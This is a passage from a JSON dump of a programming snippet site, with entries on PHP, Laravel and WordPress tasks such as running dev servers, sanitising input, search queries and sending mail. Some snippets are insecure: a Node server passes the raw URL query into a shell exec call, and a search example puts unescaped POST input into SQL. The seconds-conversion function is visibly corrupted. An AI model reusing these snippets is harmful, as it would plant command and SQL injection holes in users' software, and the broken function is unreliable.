    "keyword": null,
    "link": null,
    "title": " run php dev server",
    "description": "cd path/to/your/app php -S localhost:8000\n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4650,
    "keyword": null,
    "link": null,
    "title": " run php on node js server",
    "description": "var http = require(\"http\"), fs = require(\"fs\"), path = require(\"path\"), url = require(\"url\"), runner = require(\"child_process\");  function sendError(errCode, errString, response) {   response.writeHead(errCode, {\"Content-Type\": \"text/plain;charset=utf-8\"});   response.write(errString + \"\\n\");   response.end();   return false; }  function sendData(err, stdout, stderr, response) {   if (err) return sendError(500, stderr, response);   response.writeHead(200,{\"Content-Type\": \"text/plain;charset=utf-8\"});   response.write(stdout);   response.end(); }  function runScript(exists, file, param, response) {   if(!exists) return sendError(404, 'File not found', response);   runner.exec(\"php \" + file + \" \" + param,    function(err, stdout, stderr) { sendData(err, stdout, stderr, response); }); }  function php(request, response) {   var urlpath = url.parse(request.url).pathname;   var param = url.parse(request.url).query;   var localpath = path.join(process.cwd(), urlpath);   fs.exists(localpath, function(result) { runScript(result, localpath, param, response)}); }  var server = http.createServer(php); server.listen(1000); console.log(\"PHP ready to run script given on port 1000.\");\n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4651,
    "keyword": null,
    "link": null,
    "title": " run php script from another php",
    "description": "<?php  include('log test.php'); $output = shell_exec('php filename.php'); echo \"<pre>$output</pre>\";  $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, \"http://localhost/Ia2/Watering/tests/log test.php\"); //URL of the file curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  $output = curl_exec($ch); curl_close($ch); echo \"<pre>$output</pre>\"; ?>\n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4652,
    "keyword": null,
    "link": null,
    "title": " run php server",
    "description": "cd path/to/your/app php -S localhost:8000\nOpen Terminal php -S localhost:8000\ncd path/to/your/app/script php -S localhost:1234\n1) cd ~/public_html 2) php -S localhost:8000\n$ cd ~/public_html $ php -S localhost:8000\nphp -S 127.0.0.1:8000\n",
    "reg_date": "2021-10-12T10:20:09.000Z"
  },
  {
    "id": 4653,
    "keyword": null,
    "link": null,
    "title": " run php server mac",
    "description": "php -S localhost:9000\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4654,
    "keyword": null,
    "link": null,
    "title": " run php server on ubuntu",
    "description": "Update and Update Packages. ... Install Apache2. ... Install PHP. ... Install MySQL. ... Install phpMyAdmin. ... Create a Database(Only if our PHP app needs a database to run) ... Copy/paste or clone the project to the root directory of the Apache webserver. ... Running the PHP file or project.\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4655,
    "keyword": null,
    "link": null,
    "title": " run powershell script in background",
    "description": "powershell.exe -windowstyle hidden -file C:\\\\iis_test.ps1\nPowershell.exe -windowstyle hidden -file C:\\iis_test.ps1 \n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4656,
    "keyword": null,
    "link": null,
    "title": " run shell script from php file",
    "description": "echo shell_exec('sh /home/scripts/fix-perm.sh'); \nphp php_file.php // or php php_file.php > result_file.txt // to display the result of echoes or dumps\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4657,
    "keyword": null,
    "link": null,
    "title": " running a laravel app locally",
    "description": "Create a database locally named what ever you want utf8_general_ci Download composer https://getcomposer.org/download/ Pull Laravel/php project from git provider. Rename .env.example file to .env inside your project root and fill the database information. (windows wont let you do it, so you have to open your console cd your project root directory and run mv .env.example .env ) Open the console and cd your project root directory Run composer install or php composer.phar install Run php artisan key:generate Run php artisan migrate Run php artisan db:seed to run seeders, if any. Run php artisan serve\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4658,
    "keyword": null,
    "link": null,
    "title": " running laravel as host",
    "description": "php artisan serve --host=195.154.12.125 --port=8001   project host in local machine\n// command to host laravel project on local machine  //php artitan serve --host=your ip address --port=select port php artisan serve --host=195.154.12.125 --port=8001\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4659,
    "keyword": null,
    "link": null,
    "title": " sanctum auth check?",
    "description": "auth('sanctum')->check();\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4660,
    "keyword": null,
    "link": null,
    "title": " sanitize form data php",
    "description": "# sanitize form data function clean($data) {     $data = htmlspecialchars($data);     $data = stripslashes($data);     $data = trim($data);     return $data; }\n#Filter Validation  <?php     //checks for posted data     /*     if(filter_has_var(INPUT_POST,'data')){         echo 'Data Found';     }else{         echo 'No Data';     }     */     if(filter_has_var(INPUT_POST,'data')){         //remove illegal chars         $email = $_POST['data'];         $email = filter_var($email, FILTER_SANITIZE_EMAIL);         echo $email.'<br>';       //validate as an email address      if(filter_input(INPUT_POST, 'data', FILTER_VALIDATE_EMAIL)){         echo 'Email is Valid';      }else{         echo 'Email is not Valid';      }           //we can use the below if we use the sanatizer above      if(filter_var($email, FILTER_VALIDATE_EMAIL)){         echo 'Email is Valid';      }else{         echo 'Email is not Valid';     } }     #Other Validations     #FILTER_VALIDATE_BOOLEAN     #FILTER_VALIDATE_EMAIL     #FILTER_VALIDATE_FLOAT     #FILTER_VALIDATE_INT     #FILTER_VALIDATE_IP     #FILTER_VALIDATE_REGEXP  'REGULAR EXPRESSION'     #FILTER_VALIDATE_URL      #Other sanatizes     #FILTER_SANATIZE_EMAIL     #FILTER_SANATIZE_ENCODED     #FILTER_SANATIZE_NUMBER_FLOAT     #FILTER_SANATIZE_NUMBER_INT     #FILTER_SANATIZE_SPECIAL_CHARS     #FILTER_SANATIZE_STRING     #FILTER_SANATIZE_URL      //EXAMPLE int VALIDATION     $var = 'john';     if(filter_var($var, FILTER_VALIDATE_INT)){         echo '<br>'.$var.' is a number<br>';     }else{         echo '<br>'.$var.' is not a number'.'<br>';     }      //EXAMPLE int Sanitazion     $var2 = '33k2dsdffgsdf3563sdf';     var_dump(filter_var($var2, FILTER_SANITIZE_NUMBER_INT));      //ARRAY USAGE     $filters = array(         \"data\" => FILTER_VALIDATE_EMAIL,         \"data2\" => array(             \"filter\" => FILTER_VALIDATE_INT,             \"options\" => array(                 \"min_range\" => 1,                 \"max_range\" => 100         )         )     );     print_r(filter_input_array(INPUT_POST, $filters));  ?>  <form method =\"post\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">     <input type=\"text\" name=\"data\">     <input type=\"text\" name=\"data2\">     <button type=\"submit\">Submit</button> </form>\n<?php     function cleanUserInput($userinput) {      \t\t// Open your database connection       \t$dbConnection = databaseConnect();      \t\t// check if input is empty         if (empty($userinput)) {           return;         } else {                    // Strip any html characters         $userinput = htmlspecialchars($userinput);          \t\t// Clean input using the database           $userinput = mysqli_real_escape_string($dbConnection, $userinput);         }           \t  // Return a cleaned string       return $userinput;     } ?>\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4661,
    "keyword": null,
    "link": null,
    "title": " sanitize user input php",
    "description": "# sanitize form data function clean($data) {     $data = htmlspecialchars($data);     $data = stripslashes($data);     $data = trim($data);     return $data; }\n<?php function sanitize($stringToSanitize) { \treturn addslashes(htmlspecialchars($stringToSanitize)); } // You can just use the codes themselves instead of creating a function as: echo addslashes(htmlspecialchars($stringToSanitize)); ?>\n<?php     function cleanUserInput($userinput) {      \t\t// Open your database connection       \t$dbConnection = databaseConnect();      \t\t// check if input is empty         if (empty($userinput)) {           return;         } else {                    // Strip any html characters         $userinput = htmlspecialchars($userinput);          \t\t// Clean input using the database           $userinput = mysqli_real_escape_string($dbConnection, $userinput);         }           \t  // Return a cleaned string       return $userinput;     } ?>\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4662,
    "keyword": null,
    "link": null,
    "title": " saveAll get all id save cakephp",
    "description": "public $saved_ids = array( \t\t'insert' => array( \t\t\t'count' => 0, 'id' => array() \t\t), \t\t'update' => array( \t\t\t'count' => 0, 'id' => array() \t\t)     );   function afterSave( $created, $options = array() ){ \t\tif( $created ){ \t\t\t$this->saved_ids['insert']['count']++; \t\t\t$this->saved_ids['insert']['id'][] = $this->getID();\t// get insert lasted id into database (vilh) \t\t} else { \t\t\t$this->saved_ids['update']['count']++; \t\t\t$this->saved_ids['update']['id'][] = $this->getID(); \t\t}  \t\treturn $this->saved_ids; \t}   if ($this->MemberBookFacility->saveAll($data_MemberBookFacility)) {  \tpr ($this->MemberBookFacility->saved_ids['insert']['id']);\t// get multiple ids }\n",
    "reg_date": "2021-10-12T10:20:10.000Z"
  },
  {
    "id": 4663,
    "keyword": null,
    "link": null,
    "title": " save array in mysql php",
    "description": "$names_arr = array(&ldquo;Toni Abbah&rdquo;,&rdquo;Anastacia Mast&rdquo;,&rdquo;Soji Igbonna&rdquo;); // Associative Array $users_arr[] = array(&ldquo;username&rdquo;=>&rdquo;Torah&rdquo;,&rdquo;name&rdquo;=>&rdquo;Toni Abbah&rdquo;); $users_arr[] = array(&ldquo;username&rdquo;=>&rdquo;Anamast&rdquo;,&rdquo;name&rdquo;=>&rdquo;Anastacia Mast&rdquo;); $users_arr[] = array(&ldquo;username&rdquo;=>&rdquo;soggy&rdquo;,&rdquo;name&rdquo;=>&rdquo;Soji Igbonna&rdquo;); // Serialize the Array $names_str = serialize($names_arr); $users_str = serialize($users_arr);\n",
    "reg_date": "2021-10-12T10:20:11.000Z"
  },
  {
    "id": 4664,
    "keyword": null,
    "link": null,
    "title": " save error cakephp 2",
    "description": " pr (json_encode($this->invalidFields());             use invalidFields() to check with error showing => Check in your model with column is erro  \n",
    "reg_date": "2021-10-12T10:20:11.000Z"
  },
  {
    "id": 4665,
    "keyword": null,
    "link": null,
    "title": " save post data to file php",
    "description": "file_put_contents('test.txt', file_get_contents('php://input'));\n",
    "reg_date": "2021-10-12T10:20:11.000Z"
  },
  {
    "id": 4666,
    "keyword": null,
    "link": null,
    "title": " scheduling in laravel in custom cron",
    "description": "    $schedule->command('command')->when(function (){         return Carbon::create(2020,4,28,13)->isPast();     }); \nprotected function schedule(Schedule $schedule)     {         $schedule->call(function () {          })->->monthlyOn(23, '13:00');     } \n",
    "reg_date": "2021-10-12T10:20:11.000Z"
  },
  {
    "id": 4667,
    "keyword": null,
    "link": null,
    "title": " schema::default string laravel",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \n",
    "reg_date": "2021-10-12T10:20:11.000Z"
  },
  {
    "id": 4668,
    "keyword": null,
    "link": null,
    "title": " schema error laravel",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \nuse Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }\n",
    "reg_date": "2021-10-12T10:20:11.000Z"
  },
  {
    "id": 4669,
    "keyword": null,
    "link": null,
    "title": " scope sample laravel 8",
    "description": "// in your model public function scopeField($query)     {         return $query->where('field', 'value'); //  if in header return $query->where('field', request()->field);     }  // in your controller or repository      public function index()     {         return Package::field()->get();     }\npublic function apply(Builder $builder, Model $model)     {         $builder->where('age', '>', 200);     }\n",
    "reg_date": "2021-10-12T10:20:11.000Z"
  },
  {
    "id": 4670,
    "keyword": null,
    "link": null,
    "title": " scribe laravel",
    "description": "composer require --dev knuckleswtf/scribe\nphp artisan vendor:publish --provider=\"Knuckles\\Scribe\\ScribeServiceProvider\" --tag=scribe-config\n",
    "reg_date": "2021-10-12T10:20:11.000Z"
  },
  {
    "id": 4671,
    "keyword": null,
    "link": null,
    "title": " search bar in php mysqli",
    "description": "<?php \tmysql_connect(\"localhost\", \"root\", \"\") or die(\"Error connecting to database: \".mysql_error()); \t/* \t\tlocalhost - it's location of the mysql server, usually localhost \t\troot - your username \t\tthird is your password \t\t \t\tif connection fails it will stop loading the page and display an error \t*/ \t \tmysql_select_db(\"tutorial_search\") or die(mysql_error()); \t/* tutorial_search is the name of database we've created */ ?>  <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> <head> \t<title>Search results</title> \t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \t<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\"/> </head> <body> <?php \t$query = $_GET['query'];  \t// gets value sent over search form \t \t$min_length = 3; \t// you can set minimum length of the query if you want \t \tif(strlen($query) >= $min_length){ // if query length is more or equal minimum length then \t\t \t\t$query = htmlspecialchars($query);  \t\t// changes characters used in html to their equivalents, for example: < to > \t\t \t\t$query = mysql_real_escape_string($query); \t\t// makes sure nobody uses SQL injection \t\t \t\t$raw_results = mysql_query(\"SELECT * FROM articles \t\t\tWHERE (`title` LIKE '%\".$query.\"%') OR (`text` LIKE '%\".$query.\"%')\") or die(mysql_error()); \t\t\t \t\t// * means that it selects all fields, you can also write: `id`, `title`, `text` \t\t// articles is the name of our table \t\t \t\t// '%$query%' is what we're looking for, % means anything, for example if $query is Hello \t\t// it will match \"hello\", \"Hello man\", \"gogohello\", if you want exact match use `title`='$query' \t\t// or if you want to match just full word so \"gogohello\" is out use '% $query %' ...OR ... '$query %' ... OR ... '% $query' \t\t \t\tif(mysql_num_rows($raw_results) > 0){ // if one or more rows are returned do following \t\t\t \t\t\twhile($results = mysql_fetch_array($raw_results)){ \t\t\t// $results = mysql_fetch_array($raw_results) puts data from database into array, while it's valid it does the loop \t\t\t \t\t\t\techo \"<p><h3>\".$results['title'].\"</h3>\".$results['text'].\"</p>\"; \t\t\t\t// posts results gotten from database(title and text) you can also show id ($results['id']) \t\t\t} \t\t\t \t\t} \t\telse{ // if there is no matching rows do following \t\t\techo \"No results\"; \t\t} \t\t \t} \telse{ // if query length is less than minimum \t\techo \"Minimum length is \".$min_length; \t} ?> </body> </html>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> <head> \t<title>Search</title> \t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \t<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\"/> </head> <body> \t<form action=\"search.php\" method=\"GET\"> \t\t<input type=\"text\" name=\"query\" /> \t\t<input type=\"submit\" value=\"Search\" /> \t</form> </body> </html>\n",
    "reg_date": "2021-10-12T10:20:12.000Z"
  },
  {
    "id": 4672,
    "keyword": null,
    "link": null,
    "title": " search function using php for database entries",
    "description": "<?php     $con= new mysqli(\"localhost\",\"root\",\"\",\"Employee\");     $name = $_post['search'];     //$query = \"SELECT * FROM employees    // WHERE first_name LIKE '%{$name}%' OR last_name LIKE '%{$name}%'\";      // Check connection     if (mysqli_connect_errno())       {       echo \"Failed to connect to MySQL: \" . mysqli_connect_error();       }  $result = mysqli_query($con, \"SELECT * FROM employees     WHERE first_name LIKE '%{$name}%' OR last_name LIKE '%{$name}%'\");  while ($row = mysqli_fetch_array($result)) {         echo $row['first_name'] . \" \" . $row['last_name'];         echo \"<br>\"; }     mysqli_close($con);     ?>\n$result = mysqli_query($con, \"SELECT * FROM employees     WHERE first_name LIKE '%{$name}%' OR last_name LIKE '%{$name}%'\");  while ($row = mysqli_fetch_array($result)) {         echo $row['first_name'] . \" \" . $row['last_name'];         echo \"<br>\"; }     mysqli_close($con);     ?>\n",
    "reg_date": "2021-10-12T10:20:12.000Z"
  },
  {
    "id": 4673,
    "keyword": null,
    "link": null,
    "title": " search on taxonomy wordpress query",
    "description": "// We get a list taxonomies on the search box function get_tax_by_search($search_text){  $args = array(     'taxonomy'      => array( 'my_tax' ), // taxonomy name     'orderby'       => 'id',      'order'         => 'ASC',     'hide_empty'    => true,     'fields'        => 'all',     'name__like'    => $search_text );   $terms = get_terms( $args );   $count = count($terms);  if($count > 0){      echo \"<ul>\";      foreach ($terms as $term) {        echo \"<li><a href='\".get_term_link( $term ).\"'>\".$term->name.\"</a></li>\";       }      echo \"</ul>\";  }  }  // sample get_tax_by_search('Foo');\n",
    "reg_date": "2021-10-12T10:20:12.000Z"
  },
  {
    "id": 4674,
    "keyword": null,
    "link": null,
    "title": " search post by post title in wordpres",
    "description": "get_post( $post_id )->post_title\nCode $args = array(\"post_type\" => \"mytype\", \"s\" => $title); $query = get_posts( $args );\n",
    "reg_date": "2021-10-12T10:20:12.000Z"
  },
  {
    "id": 4675,
    "keyword": null,
    "link": null,
    "title": " search query in laravel",
    "description": "$result = Marriage::where('name','LIKE','%'.$email_or_name.'%')                 ->orWhere('email','LIKE','%'.$email_or_name.'%')                 ->get();\n$searchTerm ='milad zamir Abc'; $reservedSymbols = ['-', '+', '<', '>', '@', '(', ')', '~']; $searchTerm = str_replace($reservedSymbols, ' ', $searchTerm);  $searchValues = preg_split('/\\s+/', $searchTerm, -1, PREG_SPLIT_NO_EMPTY);  $res = User::where(function ($q) use ($searchValues) { \tforeach ($searchValues as $value) {     $q->orWhere('name', 'like', \"%{$value}%\");     $q->orWhere('family_name', 'like', \"%{$value}%\");     } })->get();\n                ->whereHas('translation', function ($query) use ($name){                     $query->where('name', 'like', $name);                 }, '>=', 10) \n// Retrieve a model by its primary key... $flight = App\\Models\\Flight::find(1);  // Retrieve the first model matching the query constraints... $flight = App\\Models\\Flight::where('active', 1)->first();  // Shorthand for retrieving the first model matching the query constraints... $flight = App\\Models\\Flight::firstWhere('active', 1);\nThe find Method If you are overriding the find method in your own models and calling parent::find() within your custom method, you should now change it to call the find method on the Eloquent query builder:  public static function find($id, $columns = ['*']) {     $model = static::query()->find($id, $columns);      // ...      return $model; }\nreturn Destination::orderByDesc(     Flight::select('arrived_at')         ->whereColumn('destination_id', 'destinations.id')         ->orderBy('arrived_at', 'desc')         ->limit(1) )->get();\n",
    "reg_date": "2021-10-12T10:20:12.000Z"
  },
  {
    "id": 4676,
    "keyword": null,
    "link": null,
    "title": " searchable dropdown laravel blade",
    "description": "<link href=\"https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.6-rc.0/css/...; rel=\"stylesheet\" /> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.6-rc.0/js/s...;></script>  <select class=\"js-example-basic-single\" name=\"state\">   <option value=\"AL\">Alabama</option>     ...   <option value=\"WY\">Wyoming</option> </select>    // In your Javascript (external .js resource or <script> tag) $(document).ready(function() {     $('.js-example-basic-single').select2(); });\n",
    "reg_date": "2021-10-12T10:20:12.000Z"
  },
  {
    "id": 4677,
    "keyword": null,
    "link": null,
    "title": " searching and removing element from an array php",
    "description": "<?php $hackers = array ('Alan Kay', 'Peter Norvig', 'Linus Trovalds', 'Larry Page');  print_r($hackers);  // Search $pos = array_search('Linus Trovalds', $hackers);  echo 'Linus Trovalds found at: ' . $pos;  // Remove from array unset($hackers[$pos]);  print_r($hackers);\n",
    "reg_date": "2021-10-12T10:20:12.000Z"
  },
  {
    "id": 4678,
    "keyword": null,
    "link": null,
    "title": " searching inside a file using php",
    "description": "<?php $file = 'somefile.txt'; $searchfor = 'name';  // the following line prevents the browser from parsing this as HTML. header('Content-Type: text/plain');  // get the file contents, assuming the file to be readable (and exist) $contents = file_get_contents($file); // escape special characters in the query $pattern = preg_quote($searchfor, '/'); // finalise the regular expression, matching the whole line $pattern = \"/^.*$pattern.*\\$/m\"; // search, and store all matching occurences in $matches if(preg_match_all($pattern, $contents, $matches)){    echo \"Found matches:\\n\";    echo implode(\"\\n\", $matches[0]); } else{    echo \"No matches found\"; }\n",
    "reg_date": "2021-10-12T10:20:12.000Z"
  },
  {
    "id": 4679,
    "keyword": null,
    "link": null,
    "title": " seconds to days hours minutes seconds php",
    "description": "echo gmdate(\"H:i:s\", 685);\nfunction seconds2human($ss) { $s = $ss`; $m = floor(($ss600)/60); $h = floor(($ss%86400)/3600); $d = floor(($ss%92000)/86400); $M = floor($ss/2592000);  return \"$M months, $d days, $h hours, $m minutes, $s seconds\"; }\n<?php $str = 'Tue Dec 15 2009'; $timestamp = strtotime($str); echo $timestamp; //output: 1260831600 ?>\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4680,
    "keyword": null,
    "link": null,
    "title": " seconds to minutes php",
    "description": "echo gmdate(\"H:i:s\", 685);\nfunction seconds2human($ss) { $s = $ss`; $m = floor(($ss600)/60); $h = floor(($ss%86400)/3600); $d = floor(($ss%92000)/86400); $M = floor($ss/2592000);  return \"$M months, $d days, $h hours, $m minutes, $s seconds\"; }\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4681,
    "keyword": null,
    "link": null,
    "title": " select2 multiple in php",
    "description": "// In your HTML: <form method=\"post\">   <select class=\"select2\" name=\"listbox[]\" multiple=\"multiple\">     <option value=\"One\">One</option>     <option value=\"Two\">Two</option>     <option value=\"Three\">Three</option>     <option value=\"Four\">Four</option>   </select>   <input type=\"submit\" name=\"btn\" value=\"Get the Records\"> </form>  // In your Javascript (external .js resource or <script> tag): $(document).ready(function() {   $('.select2').select2(); });  // In your PHP  <?php    if (isset($_POST['btn']) && $_SERVER['REQUET_METHOD']===\"POST\") {     $items = $_POST['listbox'];     foreach ($items as $item) {       // Run SQL Query or do any other action       echo $item.'<br>';     }   }    ?>\n<form action=\"ResultsDulith.php\" id=\"intermediate\" name=\"inputMachine[]\" multiple=\"multiple\" method=\"post\">     <select id=\"selectDuration\" name=\"selectDuration[]\" multiple=\"multiple\">          <option value=\"1 WEEK\" >Last 1 Week</option>         <option value=\"2 WEEK\" >Last 2 Week </option>         <option value=\"3 WEEK\" >Last 3 Week</option>          <option value=\"4 WEEK\" >Last 4 Week</option>           <option value=\"5 WEEK\" >Last 5 Week</option>            <option value=\"6 WEEK\" >Last 6 Week</option>     </select>      <input type=\"submit\"/>  </form> \n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4682,
    "keyword": null,
    "link": null,
    "title": " select 2 yii2",
    "description": "$form->field($model, 'attribute')->widget(\\kartik\\select2\\Select2::classname(), [                 'data' => \\yii\\helpers\\ArrayHelper::map(Model::find()->all(), 'id', 'username'),                 'options' => ['placeholder' => 'Tanlang', 'multiple' => false, 'required' => true],                 'theme' => \\kartik\\select2\\Select2::THEME_KRAJEE,                 'size' => 'xs',\nuse kartik\\select2\\Select2;  // Normal select with ActiveForm & model echo $form->field($model, 'state_1')->widget(Select2::classname(), [     'data' => $data,     'language' => 'de',     'options' => ['placeholder' => 'Select a state ...'],     'pluginOptions' => [         'allowClear' => true     ], ]);  // Multiple select without model echo Select2::widget([     'name' => 'state_2',     'value' => '',     'data' => $data,     'options' => ['multiple' => true, 'placeholder' => 'Select states ...'] ]);\n$ php composer.phar require kartik-v/yii2-widget-select2 \"@dev\"\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4683,
    "keyword": null,
    "link": null,
    "title": " select case default php",
    "description": " <?php switch ($i) {     case 0:         echo \"i equals 0\";         break;     case 1:         echo \"i equals 1\";         break;     case 2:         echo \"i equals 2\";         break;     default:        echo \"i is not equal to 0, 1 or 2\"; } ?>  \n<?php switch ($i) {     case \"apple\":         echo \"i is apple\";         break;     case \"bar\":         echo \"i is bar\";         break;     case \"cake\":         echo \"i is cake\";         break; } ?>\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4684,
    "keyword": null,
    "link": null,
    "title": " select distinct laravel",
    "description": "$items = DB::table('item')->select('item_name')->distinct()->get();\n$ad->getcodes()->distinct('pid')->count('pid');\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4685,
    "keyword": null,
    "link": null,
    "title": " select same text in phpstorm",
    "description": "Alt + j\nCtrl-Cmd-G on Mac OS X\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4686,
    "keyword": null,
    "link": null,
    "title": " select sum in laravel",
    "description": "Sometime for such queries you need to disable the strict check  So inside config/database.php and inside mysql,   Set 'strict' => false,  ->select('user_id', DB::raw('SUM(points) as total_points'))\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4687,
    "keyword": null,
    "link": null,
    "title": " select values from mysql using php array of ids",
    "description": "$sql = 'SELECT *            FROM `table`           WHERE `id` IN (' . implode(',', array_map('intval', $array)) . ')';\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4688,
    "keyword": null,
    "link": null,
    "title": " send application/json php",
    "description": "// API URL $url = 'http://www.example.com/api';  // Create a new cURL resource $ch = curl_init($url);  // Setup request to send json via POST $data = array(   'username' => 'codexworld',   'password' => '123456'); $payload = json_encode(array(\"user\" => $data));  // Attach encoded JSON string to the POST fields curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);  // Set the content type to application/json curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));  // Return response instead of outputting curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // Execute the POST request $result = curl_exec($ch);  // Close cURL resource curl_close($ch);\n<?php $jsonurl = \"http://api.wipmania.com/json\"; $json = file_get_contents($jsonurl); var_dump(json_decode($json)); ?>\n",
    "reg_date": "2021-10-12T10:20:13.000Z"
  },
  {
    "id": 4689,
    "keyword": null,
    "link": null,
    "title": " send attachment in mail php",
    "description": "    $filename = 'myfile';     $path = 'your path goes here';     $file = $path . \"/\" . $filename;      $mailto = 'mail@mail.com';     $subject = 'Subject';     $message = 'My message';      $content = file_get_contents($file);     $content = chunk_split(base64_encode($content));      // a random hash will be necessary to send mixed content     $separator = md5(time());      // carriage return type (RFC)     $eol = \"\\r\\n\";      // main header (multipart mandatory)     $headers = \"From: name <test@test.com>\" . $eol;     $headers .= \"MIME-Version: 1.0\" . $eol;     $headers .= \"Content-Type: multipart/mixed; boundary=\\\"\" . $separator . \"\\\"\" . $eol;     $headers .= \"Content-Transfer-Encoding: 7bit\" . $eol;     $headers .= \"This is a MIME encoded message.\" . $eol;      // message     $body = \"--\" . $separator . $eol;     $body .= \"Content-Type: text/plain; charset=\\\"iso-8859-1\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: 8bit\" . $eol;     $body .= $message . $eol;      // attachment     $body .= \"--\" . $separator . $eol;     $body .= \"Content-Type: application/octet-stream; name=\\\"\" . $filename . \"\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: base64\" . $eol;     $body .= \"Content-Disposition: attachment\" . $eol;     $body .= $content . $eol;     $body .= \"--\" . $separator . \"--\";      //SEND Mail     if (mail($mailto, $subject, $body, $headers)) {         echo \"mail send ... OK\"; // or use booleans here     } else {         echo \"mail send ... ERROR!\";         print_r( error_get_last() );     } \n    $filename = 'myfile';     $path = 'your path goes here';     $file = $path . \"/\" . $filename;      $mailto = 'mail@mail.com';     $subject = 'Subject';     $message = 'My message';      $content = file_get_contents($file);     $content = chunk_split(base64_encode($content));      // a random hash will be necessary to send mixed content     $separator = md5(time());      // carriage return type (RFC)     $eol = \"\\r\\n\";      // main header (multipart mandatory)     $headers = \"From: name <test@test.com>\" . $eol;     $headers .= \"MIME-Version: 1.0\" . $eol;     $headers .= \"Content-Type: multipart/mixed; boundary=\\\"\" . $separator . \"\\\"\" . $eol;     $headers .= \"Content-Transfer-Encoding: 7bit\" . $eol;     $headers .= \"This is a MIME encoded message.\" . $eol;      // message     $body = \"--\" . $separator . $eol;     $body .= \"Content-Type: text/plain; charset=\\\"iso-8859-1\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: 8bit\" . $eol;     $body .= $message . $eol;      // attachment     $body .= \"--\" . $separator . $eol;     $body .= \"Content-Type: application/octet-stream; name=\\\"\" . $filename . \"\\\"\" . $eol;     $body .= \"Content-Transfer-Encoding: base64\" . $eol;     $body .= \"Content-Disposition: attachment\" . $eol;     $body .= $content . $eol;     $body .= \"--\" . $separator . \"--\";      //SEND Mail     if (mail($mailto, $subject, $body, $headers)) {         echo \"mail send ... OK\"; // or use booleans here     } else {         echo \"mail send ... ERROR!\";         print_r( error_get_last() );     }\n$my_file = \"somefile.zip\"; $my_path = \"/your_path/to_the_attachment/\"; $my_name = \"Olaf Lederer\"; $my_mail = \"my@mail.com\"; $my_replyto = \"my_reply_to@mail.net\"; $my_subject = \"This is a mail with attachment.\"; $my_message = \"Hallo,rndo you like this script? I hope it will help.rnrngr. Olaf\"; mail_attachment($my_file, $my_path, \"recipient@mail.org\", $my_mail, $my_name, $my_replyto, $my_subject, $my_message);\n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4690,
    "keyword": null,
    "link": null,
    "title": " send axios request to php",
    "description": "<?php     $rp = json_decode(file_get_contents('php://input'), true); \n// JS axios.post(url, JSON.stringify({ name: \"this.name\", email: \"this.psswrd\" }))    // PHP $_POST = json_decode(array_keys($_POST)[0], true);\n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4691,
    "keyword": null,
    "link": null,
    "title": " send email when form is submitted php",
